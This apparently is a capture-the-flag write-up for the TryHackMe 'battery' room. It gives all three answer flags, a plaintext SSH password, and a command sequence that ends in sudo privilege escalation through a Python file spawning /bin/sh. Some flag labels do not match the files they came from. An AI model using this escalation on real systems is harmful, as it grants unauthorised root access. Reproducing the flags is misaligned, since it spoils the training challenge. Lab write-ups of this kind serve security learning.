# <div align="center">[battery](https://tryhackme.com/r/room/battery)</div>
<div align="center">CTF designed by CTF lover for CTF lovers</div>
<br>
<div align="center">
<img src="https://github.com/user-attachments/assets/044f2d97-3571-49d0-811f-cb13b31d4293" height="200"></img>
</div>



## Task 1. battery

Electricity bill portal has been hacked many times in the past , so we have fired one of the employee from the security team , As a new recruit you need to work like a hacker to find the loop holes in the portal and gain root access to the server .

Hope you will enjoy the journey ! 

### Base Flag : 
```
THM{6f7e4dd134e19af144c88e4fe46c67ea}
```
### User Flag :
```
THM{20c1d18791a246001f5df7867d4e6bf5}
```
Root Flag :
```
THM{db12b4451d5e70e2a177880ecfe3428d}
```

# Writeup

* ```nmap -sSCV <IP>```
* ```gobuster dir -u http://<IP> -w /usr/share/dirb/wordlists /common.txt -x txt,php```
* ```<IP>/register.php```
* ```<IP>/report```
* ```strings report```
* ```echo "base64EncodedString" | base64 -d >> output.php```
* ```cyber:super#secure&password!```
* ```ssh cyber@<IP>```
* ```cat flag1.txt```
```
THM{6f7e4dd134e19af144c88e4fe46c67ea}
```

* ```sudo -l```
* ```echo 'import os; os.system("/bin/sh")' > /home/cyber/run.py```
* ```chmod +x run.py```
* ```cyber@ubuntu:~$ sudo /usr/bin/python3 /home/cyber/run.py```
* ```cat /root/root.txt```
```
THM{20c1d18791a246001f5df7867d4e6bf5}
```

* ```cd /home```
* ```ls```
* ```cyber yash```
* ```cd cyber```
* ```ls```
* ```cyber yash```
* ```emergency.py fernet flag2.txt root.txt```
* ```cat flag2.txt```
```
THM{db12b4451d5e70e2a177880ecfe3428d}
```
